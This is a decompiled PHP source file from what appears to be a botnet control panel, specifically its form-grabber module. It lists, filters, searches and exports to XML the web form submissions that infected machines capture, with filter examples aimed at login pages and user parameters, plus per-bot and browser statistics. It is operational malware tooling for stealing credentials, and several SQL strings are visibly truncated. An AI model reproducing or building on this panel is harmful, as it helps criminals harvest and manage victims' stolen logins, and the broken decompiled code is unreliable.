<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\r\n\t";
if (!defined("IN_INDEX_PAGE")) {
    exit("..");
}
if (!((int) $Session->Rights() & USER_PRIVILEGES_VIEW_LOGS)) {
    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to view stored logs.", true, 600);
} else {
    require_once "include/gateway_defines.inc";
    require_once "include/gateway_functionality.inc";
    $_BROWSER_TYPE_STRINGS = array("Unknown source", "Internet Explorer", "Firefox", "Chrome", "Opera");
    define("CHROME_STRING", "\\chrom");
    define("FIREFOX_STRING", "\\firefo");
    define("IE_STRING", "\\iexplor");
    define("MOD_FORMS_ALERT_WIDTH", 1572);
    define("MOD_FORMS_NOTICE_SUCCESS", "Filter successfully added to list.");
    define("MOD_FORMS_NOTICE_ERROR_SQL_ERROR", "An SQL error occured and the filter could not be added.");
    define("MOD_FORMS_NOTICE_ERROR_FILTER_REQUIRED", "You must provide valid filter(s) to add.");
    define("MOD_FORMS_NOTICE_ERROR_INVALID_FILTER", "The filter you provided is too long and/or invalid.");
    define("MOD_FORMS_NOTICE_ERROR_TOO_GENERIC", "The filter you provided is too generic. Please only use filters pertaining to specific websites and not global form captures.");
    $sqlGrab = new CFormGrab();
    $sqlGrab->SetInternalLink($main_sql_link);
    $font_style = "font-size: 10px; face: font-family: Tahoma;";
    $pp_num_existing_export_logs = 0;
    $pp_current_form_capture_view = (int) (isset($_GET["view_form"]) && is_numeric($_GET["view_form"])) ? (int) $_GET["view_form"] : -1;
    $pp_current_forms_view_page = (int) (isset($_GET["forms_page"]) && is_numeric($_GET["forms_page"])) ? (int) $_GET["forms_page"] : 1;
    $pp_export_action_is_true = isset($_POST["export_submit"]) || isset($_POST["export_special_submit"]) ? true : false;
    $pp_export_action_clear_is_true = isset($_POST["export_submit_clear"]) ? true : false;
    $pp_is_search_active = false;
    $pp_client_view_id = (int) isset($_GET["client_view"]) ? (int) $_GET["client_view"] : -1;
    $pp_search_term_host = isset($_GET["fs_host"]) ? $_GET["fs_host"] : "";
    $pp_search_term_guids = isset($_GET["fs_bot_guids"]) ? $_GET["fs_bot_guids"] : "";
    $pp_search_term_content = isset($_GET["fs_content"]) ? $_GET["fs_content"] : "";
    $pp_search_date_start = 0;
    $pp_search_date_end = 0;
    $max_per_page = 30;
    $min_start_page = ($pp_current_forms_view_page - 1) * $max_per_page;
    $total_num_forms = 0;
    $all_forms = NULL;
    $stats_total_forms = $sqlGrab->Stats_GetTotalForms();
    $pp_export_path = DIR_EXPORTS . "/forms_" . @date("m_d_Y_his", @time()) . ".xml";
    if ($pp_export_action_clear_is_true == true) {
        $pp_clear_export_path = DIR_EXPORTS . "/";
        foreach (@glob($pp_clear_export_path . "forms_*.xml") as $pp_export_file) {
            @unlink($pp_export_file);
        }
    }
    if (isset($_GET["form_filters"]) && isset($_GET["filter_action"])) {
        $act_err_notice = "";
        $act_suc_notice = "";
        $postdata = file_get_contents("php://input");
        $filter_log_text = "";
        if (!isset($postdata) || strlen($postdata) < 5) {
            if ($_GET["filter_action"] === "delete_all") {
                $query_string = "DELETE FROM " . SQL_DATABASE . ".grabbed_form_filters WHERE id >= 0";
                $act_err_notice = "No filters were deleted. List was either empty or there was an error deleting filters.";
                $act_suc_notice = "Filters successfully deleted.";
                $filter_log_text = "All filters were deleted";
            } else {
                if ($_GET["filter_action"] === "suspend_all") {
                    $query_string = "UPDATE " . SQL_DATABASE . ".grabbed_form_filters SET options = " . FILTER_OPTIONS_STATE_DISABLED . " WHERE options = 0";
                    $act_err_notice = "No filters were suspended. List was either empty, there was an error suspending filters, or no filters were in an active state";
                    $act_suc_notice = "All filters successfully suspended.";
                    $filter_log_text = "All filters were suspended";
                } else {
                    if ($_GET["filter_action"] === "resume_all") {
                        $query_string = "UPDATE " . SQL_DATABASE . ".grabbed_form_filters SET options = 0 WHERE options != 0";
                        $act_err_notice = "No filters were resumed. List was either empty, there was an error suspending filters, or no filters were in a suspended state.";
                        $act_suc_notice = "All filters successfully resumed.";
                        $filter_log_text = "All filters were resumed";
                    }
                }
            }
            if (8 < strlen($query_string) && $sqlGrab->Query($query_string)) {
                if (1 <= mysql_affected_rows()) {
                    global $mCache;
                    global $sqlSettings;
                    global $main_sql_link;
                    global $Session;
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, $act_suc_notice, true, MOD_FORMS_ALERT_WIDTH);
                    $elogs = new CLogs();
                    $elogs->SetInternalLink($main_sql_link);
                    $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_FORMS_MODIFIED_FILTERS, $filter_log_text);
                    $sqlSettings->Update_UrlTrack_Revision();
                    $mCache->Set(CACHE_CONFIG_URL_TRACK_LIST, "");
                } else {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, $act_err_notice, true, MOD_FORMS_ALERT_WIDTH);
                }
            }
        }
    } else {
        if (isset($_POST["set_formgrab_status_submit_on"])) {
            $new_flags = (int) $sqlSettings->Flags_General;
            $new_flags &= ~GENERAL_FLAGS_FORMGRAB_DISABLED;
            if ($sqlSettings->UpdateGeneralFlags($new_flags)) {
                $sqlSettings->Flags_General &= ~GENERAL_FLAGS_FORMGRAB_DISABLED;
                global $sqlSettings;
                global $main_sql_link;
                global $Session;
                $elogs = new CLogs();
                $elogs->SetInternalLink($main_sql_link);
                $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_GRABBER_STATUS_CHANGED, "Formgrabber status set to ON");
            }
        } else {
            if (isset($_POST["set_formgrab_status_submit_off"])) {
                $new_flags = (int) $sqlSettings->Flags_General;
                $new_flags |= GENERAL_FLAGS_FORMGRAB_DISABLED;
                if ($sqlSettings->UpdateGeneralFlags($new_flags)) {
                    $sqlSettings->Flags_General |= GENERAL_FLAGS_FORMGRAB_DISABLED;
                    global $sqlSettings;
                    global $main_sql_link;
                    global $Session;
                    $elogs = new CLogs();
                    $elogs->SetInternalLink($main_sql_link);
                    $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_GRABBER_STATUS_CHANGED, "Formgrabber status set to OFF");
                }
            } else {
                if (isset($_POST["clear_hidden_all_forms_submit"]) || isset($_POST["clear_hidden_all_forms_7d_submit"])) {
                    if (isset($_POST["clear_hidden_all_forms_submit"])) {
                        $sqlGrab->Query("TRUNCATE TABLE " . SQL_DATABASE . ".grabbed_forms");
                    } else {
                        $p_capture_date_m7d = (int) (time() - 84600 * 7);
                        $sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE capture_date < " . $p_capture_date_m7d);
                    }
                }
            }
        }
    }
    $default_query = "SELECT * FROM " . SQL_DATABASE . ".grabbed_forms";
    if (isset($_GET["form_filters"]) && isset($_GET["export_by_filter"]) && is_numeric($_GET["export_by_filter"])) {
        $filter_mask_query = $sqlGrab->Query("SELECT * FROM " . SQL_DATABASE . ".grabbed_form_filters WHERE id = '" . $_GET["export_by_filter"] . "'");
        if ($filter_mask_query) {
            $row_result = mysql_fetch_assoc($filter_mask_query);
            if ($row_result && isset($row_result["filter_mask"]) && strlen($row_result["filter_mask"])) {
                $by_filter_count = 0;
                $pfilter_mask = str_replace("*", "%", $row_result["filter_mask"]);
                $pfilter_mask = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($pfilter_mask);
                $filter_mask_len = (int) strlen($pfilter_mask);
                $export_by_column = "host";
                if (substr_count($pfilter_mask, "content:") == 1) {
                    $pfilter_mask = str_replace("content:", "", $pfilter_mask);
                    $export_by_column = "post_data";
                }
                $default_query = "SELECT * FROM " . SQL_DATABASE . ".grabbed_forms WHERE REPLACE(" . $export_by_column . ",'" . $pfilter_mask . "'";
                $pp_export_action_is_true = true;
            }
        }
    } else {
        if (isset($_GET["clear_garbage"]) && $_GET["clear_garbage"] == "1") {
            $shit_count = 0;
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count = mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(host, '")) {
                $shit_count += mysql_affected_rows();
            }
            if ($shit_count != 0) {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, (string) $shit_count . " potentially useless form captures deleted from database", true, MOD_FORMS_ALERT_WIDTH);
            } else {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_INFO, "No potentially useless form captures found", true, MOD_FORMS_ALERT_WIDTH);
            }
        } else {
            if (isset($_GET["delete_form"]) && is_numeric($_GET["delete_form"])) {
                $del_id = (int) $_GET["delete_form"];
                if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_forms WHERE id = " . $del_id . " LIMIT 1")) {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Deleted form capture #" . $del_id . " from database", true, MOD_FORMS_ALERT_WIDTH);
                } else {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to delete form capture #" . $del_id . " from database", true, MOD_FORMS_ALERT_WIDTH);
                }
            } else {
                if (isset($_GET["filter_state"])) {
                    if (!isset($_GET["form_filter_id"]) || !is_numeric($_GET["form_filter_id"])) {
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "NULL or invalid form filter id provided.", true, MOD_FORMS_ALERT_WIDTH);
                    } else {
                        if ($_GET["filter_state"] !== "enable" && $_GET["filter_state"] !== "disable") {
                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Invalid filter state modifier provided.", true, MOD_FORMS_ALERT_WIDTH);
                        } else {
                            $query_string = "UPDATE " . SQL_DATABASE . ".grabbed_form_filters SET options = FILTER_QUERY_OPTIONS WHERE id = " . (int) $_GET["form_filter_id"] . " AND options = FILTER_QUERY_PREV_OPTIONS LIMIT 1";
                            if ($_GET["filter_state"] === "disable") {
                                $query_string = str_replace("FILTER_QUERY_OPTIONS", FILTER_OPTIONS_STATE_DISABLED, $query_string);
                                $query_string = str_replace("FILTER_QUERY_PREV_OPTIONS", "0", $query_string);
                            } else {
                                $query_string = str_replace("FILTER_QUERY_OPTIONS", "0", $query_string);
                                $query_string = str_replace("FILTER_QUERY_PREV_OPTIONS", FILTER_OPTIONS_STATE_DISABLED, $query_string);
                            }
                            if ($sqlGrab->Query($query_string)) {
                                if (1 <= mysql_affected_rows()) {
                                    global $mCache;
                                    global $sqlSettings;
                                    global $main_sql_link;
                                    global $Session;
                                    $sqlSettings->Update_UrlTrack_Revision();
                                    $s_log_text = "Filter #" . (int) $_GET["form_filter_id"] . " ";
                                    if ($_GET["filter_state"] === "disable") {
                                        $s_log_text .= "suspended";
                                    } else {
                                        $s_log_text .= "resumed";
                                    }
                                    $elogs = new CLogs();
                                    $elogs->SetInternalLink($main_sql_link);
                                    $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_FORMS_MODIFIED_FILTERS, $s_log_text);
                                    $mCache->Set(CACHE_CONFIG_URL_TRACK_LIST, "");
                                }
                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully changed filter state.", true, MOD_FORMS_ALERT_WIDTH);
                            } else {
                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to change filter state due to an SQL error.", true, MOD_FORMS_ALERT_WIDTH);
                            }
                        }
                    }
                } else {
                    if (isset($_GET["fs_submit"]) && (isset($_GET["fs_host"]) || isset($_GET["fs_bot_guids"]))) {
                        $default_query .= " WHERE ";
                        $pp_search_term_host = @trim(@str_replace("*", "", $pp_search_term_host));
                        $pp_search_term_host = @str_replace("'", "", $pp_search_term_host);
                        $pp_search_term_host = @str_replace("\"", "", $pp_search_term_host);
                        if (0 < strlen($pp_search_term_host) && strlen($pp_search_term_host) < 256) {
                            $search_term_host = @_obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($pp_search_term_host);
                            $search_term_host_uni = "";
                            for ($i = 0; $i < strlen($search_term_host); $i++) {
                                $search_term_host_uni .= @substr($search_term_host, $i, 1) . "\\0";
                            }
                            if (@preg_match("/^[\\x20-\\x7f]*\$/D", $search_term_host) == true) {
                                $default_query .= "host LIKE '%" . $search_term_host_uni . "%'";
                                $pp_is_search_active = true;
                            }
                        }
                        if (strlen($pp_search_term_content) < 2) {
                            $pp_search_term_content = "";
                        } else {
                            $pp_search_term_content = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($pp_search_term_content);
                            if ($pp_is_search_active == true) {
                                $default_query .= " AND ";
                            }
                            $search_term_content = @_obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($pp_search_term_content);
                            $search_term_content_uni = "";
                            for ($i = 0; $i < strlen($search_term_content); $i++) {
                                $search_term_content_uni .= @substr($search_term_content, $i, 1) . "\\0";
                            }
                            $default_query .= "post_data LIKE '%" . $search_term_content_uni . "%'";
                            $pp_is_search_active = true;
                        }
                        if (isset($_GET["fs_date_start"]) && isset($_GET["fs_date_end"])) {
                            $pp_search_date_start = (int) strtotime($_GET["fs_date_start"]);
                            $pp_search_date_end = (int) strtotime($_GET["fs_date_end"]);
                            $default_query = _obfuscated_0D2B1E2A5C3F1B375C12340E381006281D3E02122E3811_($default_query);
                            if ((int) $pp_search_date_start != 0 && (int) $pp_search_date_end != 0) {
                                if ($pp_is_search_active == true) {
                                    $default_query .= " AND ";
                                }
                                $default_query .= "capture_date >= " . sprintf("%u", $pp_search_date_start) . " AND capture_date <= " . sprintf("%u", $pp_search_date_end);
                                $pp_is_search_active = true;
                            }
                        }
                        if ($pp_search_date_start != 0 && $pp_search_date_end == 0) {
                            $pp_search_date_end = time();
                        }
                        if (32 <= $pp_search_term_guids) {
                            $pp_search_term_guids .= ",";
                            $pp_search_term_guids = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_(@str_replace(", ", ",", $pp_search_term_guids));
                            $pp_search_guids_array = @explode(",", $pp_search_term_guids);
                            $ccount = 0;
                            foreach ($pp_search_guids_array as $ss_guid) {
                                if (strlen($ss_guid) == 32) {
                                    if ($ccount == 0 && $pp_is_search_active == true) {
                                        $default_query .= " AND";
                                    }
                                    $default_query .= " bot_guid = UNHEX('" . $ss_guid . "') OR ";
                                    $ccount++;
                                    $pp_is_search_active = true;
                                }
                            }
                            if (0 < $ccount) {
                                $default_query = @substr($default_query, 0, @strlen($default_query) - 4);
                            }
                        }
                        $pp_search_term_guids = @substr($pp_search_term_guids, 0, @strlen($pp_search_term_guids) - 1);
                        $pp_is_search_active = true;
                        $count_query_string = str_replace("SELECT *", "SELECT COUNT(id)", $default_query);
                        if ($pp_export_action_is_true == false) {
                            $default_query .= " ORDER BY capture_date ASC LIMIT " . $min_start_page . ", " . $max_per_page;
                        }
                        list($total_num_forms) = @mysql_fetch_row(@$sqlGrab->Query($count_query_string));
                        $all_forms = $sqlGrab->Query($default_query);
                    }
                }
            }
        }
    }
    $num_new_filters = 0;
    $num_new_filters_error = 0;
    $num_sql_errors = 0;
    $num_new_filters_exist = 0;
    if (isset($_GET["form_filters"]) && (isset($_POST["forms_add_filter_submit"]) || isset($_POST["forms_add_filter_content_submit"])) && isset($_POST["forms_add_filter"])) {
        $filter_text = $_POST["forms_add_filter"];
        if (strlen($filter_text) == 0) {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, MOD_FORMS_NOTICE_ERROR_FILTER_REQUIRED, true, MOD_FORMS_ALERT_WIDTH);
        } else {
            $filter_text = str_replace("\r", "", $filter_text);
            $filter_list = explode("\n", $filter_text);
            if ($filter_list) {
                if (count($filter_list) < 1024) {
                    foreach ($filter_list as $filter_item) {
                        $item_len = strlen($filter_item);
                        if ($item_len <= 1) {
                            continue;
                        }
                        if (@strlen(@str_replace("*", "", $filter_item)) < 4 || 242 < $item_len || strstr($filter_item, "**")) {
                            $num_new_filters_error++;
                        } else {
                            $filter_text_ex = $filter_item;
                            if (strpos($filter_text_ex, "*") === false) {
                                $filter_text_ex = "*" . $filter_text_ex . "*";
                            }
                            if (isset($_POST["forms_add_filter_content_submit"])) {
                                $filter_text_ex = "content:" . $filter_text_ex;
                            }
                            if ($sqlGrab->FilterExists($filter_text_ex) === false) {
                                if ($sqlGrab->GetFilterCount() < 1024) {
                                    if ($sqlGrab->AddFilter(0, $filter_text_ex)) {
                                        $num_new_filters++;
                                    } else {
                                        $num_sql_errors++;
                                    }
                                } else {
                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "The maximum number of filters possible has been reached. The filter: <strong>" . htmlspecialchars($filter_text_ex) . "</strong>, and any after it were not added!", true, MOD_FORMS_ALERT_WIDTH);
                                    break;
                                }
                            } else {
                                $num_new_filters_exist++;
                            }
                        }
                    }
                } else {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Too many filters were provided. There is a maximum of 1024 filters allowed. Please shorten your list and try again.", true, MOD_FORMS_ALERT_WIDTH);
                }
            }
            if (0 < $num_new_filters_error || 0 < $num_sql_errors || 0 < $num_new_filters_exist) {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Some issues were encountered adding one or more URL/content capture masks. Please evaluate the URL/content masks provided and make sure they meet the following conditions:<br />1. At least 4 characters in length, excluding any wildcards (*).<br />2. Are no longer than 242 characters.<br />3. Do not contain multiple side-by-side wildcards (**)<br />4. Does not already exist on filter list.<br />------<br />Number of improperly formatted filters: " . $num_new_filters_error . "<br />Number of filters in list that already existed: " . $num_new_filters_exist . "<br />Number of failed SQL attempts: " . $num_sql_errors, true, MOD_FORMS_ALERT_WIDTH);
            }
            if (0 < $num_new_filters) {
                global $mCache;
                global $sqlSettings;
                global $main_sql_link;
                global $Session;
                $sqlSettings->Update_UrlTrack_Revision();
                $mCache->Set(CACHE_CONFIG_URL_TRACK_LIST, "");
                $elogs = new CLogs();
                $elogs->SetInternalLink($main_sql_link);
                $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_FORMS_MODIFIED_FILTERS, (string) $num_new_filters . " new formgrab filters added");
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully added " . $num_new_filters . " new filter(s)", true, MOD_FORMS_ALERT_WIDTH);
            }
        }
    } else {
        if (isset($_GET["delete_form_filter"]) && @is_numeric($_GET["delete_form_filter"])) {
            $delete_form_filter_i = (int) $_GET["delete_form_filter"];
            $sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_form_filters WHERE id = '" . $delete_form_filter_i . "'");
            if (1 <= mysql_affected_rows()) {
                global $mCache;
                $mCache->Set(CACHE_CONFIG_URL_TRACK_LIST, "");
                global $sqlSettings;
                global $main_sql_link;
                global $Session;
                $elogs = new CLogs();
                $elogs->SetInternalLink($main_sql_link);
                $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_FORMS_MODIFIED_FILTERS, "Filter #" . $delete_form_filter_i . " deleted");
                $sqlSettings->Update_UrlTrack_Revision();
            }
        }
    }
    $guid_search_ok = 32 <= strlen($pp_search_term_guids) ? true : false;
    $guid_search_count = 0;
    $file_ptr = NULL;
    if ($pp_is_search_active == false) {
        if (-1 < $pp_current_form_capture_view) {
            $default_query = "SELECT * FROM " . SQL_DATABASE . ".grabbed_forms WHERE id = '" . $pp_current_form_capture_view . "'";
        } else {
            if (-1 < $pp_client_view_id && !isset($_GET["form_filters"])) {
                $default_query .= " WHERE bot_id = " . $pp_client_view_id;
            } else {
                if ($pp_export_action_is_true == false) {
                    if (defined("IS_SPECIAL_VERSION") && isset($_GET["view"])) {
                        if ($_GET["view"] == "post") {
                            $default_query .= " WHERE INSTR(REPLACE(post_headers, '";
                        } else {
                            if ($_GET["view"] == "get") {
                                $default_query .= " WHERE INSTR(REPLACE(post_headers, '";
                            } else {
                                if ($_GET["view"] == "special") {
                                    $default_query .= " WHERE INSTR(REPLACE(post_headers, '";
                                }
                            }
                        }
                    }
                    $default_query .= " ORDER BY capture_date DESC LIMIT " . $min_start_page . ", " . $max_per_page;
                }
            }
        }
        $all_forms = $sqlGrab->Query($default_query);
        $total_num_forms = $stats_total_forms;
    }
    $all_filters = NULL;
    $all_filters = $sqlGrab->Query("SELECT * FROM " . SQL_DATABASE . ".grabbed_form_filters");
    $total_num_filters = @mysql_num_rows($all_filters);
    $total_num_exported = 0;
    if (0 < $total_num_forms && $pp_export_action_is_true == true) {
        $file_ptr = @fopen($pp_export_path, "w");
        if (isset($_GET["export_by_filter"])) {
            $all_forms_exports = $sqlGrab->Query($default_query);
        } else {
            if (isset($_POST["export_special_submit"])) {
                $all_forms_exports = $sqlGrab->Query("SELECT * FROM " . SQL_DATABASE . ".grabbed_forms WHERE INSTR(REPLACE(post_headers, '");
            } else {
                $all_forms_exports = $sqlGrab->Query("SELECT * FROM " . SQL_DATABASE . ".grabbed_forms");
            }
        }
        if ($all_forms_exports) {
            fwrite($file_ptr, "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\r\n");
            fwrite($file_ptr, "<captured_forms>\r\n");
            $i = 0;
            $capture_type = "";
            $sqlBot = new CClient();
            while ($current_row = @mysql_fetch_assoc($all_forms_exports)) {
                $i++;
                if ($pp_export_action_is_true == true) {
                    if (stripos(str_replace("", "", $current_row["post_headers"]), "GET *") === 0) {
                        $capture_type = "get";
                    } else {
                        if (stripos(str_replace("", "", $current_row["post_headers"]), "SPECIAL *") === 0) {
                            $capture_type = "special";
                        } else {
                            if (stripos(str_replace("", "", $current_row["post_headers"]), "POST *") === 0) {
                                $capture_type = "post";
                            } else {
                                $capture_type = "unknown";
                            }
                        }
                    }
                    $capture_date = date("m/d/Y h:i:s a", $current_row["capture_date"]);
                    $os_string = $sqlBot->GetFullOsStringFromMask($current_row["bot_OS"]);
                    $export_line = "\t<form>\r\n";
                    $export_line .= "\t\t<id>" . $current_row["id"] . "</id>\r\n";
                    $export_line .= "\t\t<type>" . $capture_type . "</type>\r\n";
                    $export_line .= "\t\t<date>" . $capture_date . "</date>\r\n";
                    $export_line .= "\t\t<os>" . $os_string . "</os>\r\n";
                    $export_line .= "\t\t<bot_group>" . $current_row["bot_Group"] . "</bot_group>\r\n";
                    $export_line .= "\t\t<guid>" . bin2hex($current_row["bot_guid"]) . "</guid>\r\n";
                    $export_line .= "\t\t<url>" . str_replace("", "", $current_row["host"]) . "</url>\r\n";
                    $export_line .= "\t\t<process>" . str_replace("", "", $current_row["host_process_path"]) . "</process>\r\n";
                    $export_line .= "\t\t<form_data>" . str_replace("", "", $current_row["post_data"]) . "</form_data>\r\n";
                    $export_line .= "\t</form>\r\n";
                    @fwrite($file_ptr, $export_line);
                    $total_num_exported++;
                }
            }
            fwrite($file_ptr, "</captured_forms>");
            if ($file_ptr != NULL) {
                @fclose($file_ptr);
            }
            @mysql_free_result($all_forms_exports);
        }
    }
    $pp_dir_export_path = DIR_EXPORTS . "/";
    $pthresults = @glob($pp_dir_export_path . "forms_*.xml");
    if ($pthresults) {
        foreach ($pthresults as $pp_export_file) {
            $pp_num_existing_export_logs++;
        }
    }
    if ($sqlSettings->Flags_General & GENERAL_FLAGS_SYS_INJECTIONS_DISABLED) {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_INFO, "Bots are running in reduced functionality mode. This feature is not currently operational in this mode.", true, 900);
    }
    echo "\r\n<script>\r\n\tfunction filterexample() {\r\n\t\talert('Formgrab filter example:\\n\\n*somesite.com/login.php*\\n\\nAlways surround your filter with \\'*\\', as this is a wildcard, and comparisons are done by URL and not domain name.\\nYou can also use wildcards in the middle of a url:\\n\\n*somesite.com/*/login.php*\\n\\nWhere /*/ represents any directory. Multiple filters are accepted in above field, 1 per line.\\n\\nTo add a filter based on the content of a POST request, and not by the URL, you can add such things as *&param=*, and click the button \\'Add as content filter\\'\\n\\n');\r\n\t\treturn false;\r\n\t}\r\n\t\r\n\tfunction contentfilterexample() {\r\n\t\talert('Add your content-based filters the same as you would in the text field (eg: *&user=*), then click the \"Add as content filter\" button');\r\n\t\treturn false;\r\n\t}\r\n</script>\r\n\t\r\n<table align=\"center\">\r\n        <thead>\r\n          <tr>\r\n            <th width=\"20%\"></th>\r\n            <th width=\"80%\"></th>\r\n          </tr>\r\n        </thead>\r\n        <tbody>\r\n\t\t<tr>\r\n            <td valign=\"top\">\r\n\r\n\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t<table class=\"table-bordered table-condensed\" align=\"left\" style=\"width: 270px;\">\r\n\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t  <tr>\r\n\t\t\t\t\t\t\t<th width=\"270\"></th>\r\n\t\t\t\t\t\t  </tr>\r\n\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("General statistics", 10, "top: -3px;", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Botnet", $sqlSettings->Name);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Created", date("m/d/Y", $sqlSettings->Created));
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Version", $sqlSettings->Version);
    _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
    echo "\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t";
    $stats_total_forms_special = $sqlGrab->Stats_GetTotalSpecialForms();
    $stats_total_forms_24h = $sqlGrab->Stats_GetTotalForms_24h();
    $stats_total_forms_3d = $sqlGrab->Stats_GetTotalForms_3d();
    $stats_total_forms_7d = $sqlGrab->Stats_GetTotalForms_7d();
    $stats_total_filters = $sqlGrab->Stats_GetTotalFilters();
    $stats_total_chrome = $sqlGrab->Stats_GetChromeGrabCount();
    $stats_total_firefox = $sqlGrab->Stats_GetFirefoxGrabCount();
    $stats_total_ie = $sqlGrab->Stats_GetInternetExplorerGrabCount();
    $stats_total_chrome_percent = _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($stats_total_chrome, $stats_total_forms);
    $stats_total_firefox_percent = _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($stats_total_firefox, $stats_total_forms);
    $stats_total_ie_percent = _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($stats_total_ie, $stats_total_forms);
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Grab statistics", 10, "top: -3px;", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total forms captured", $stats_total_forms);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total special forms captured", $stats_total_forms_special);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total URL filters", $stats_total_filters);
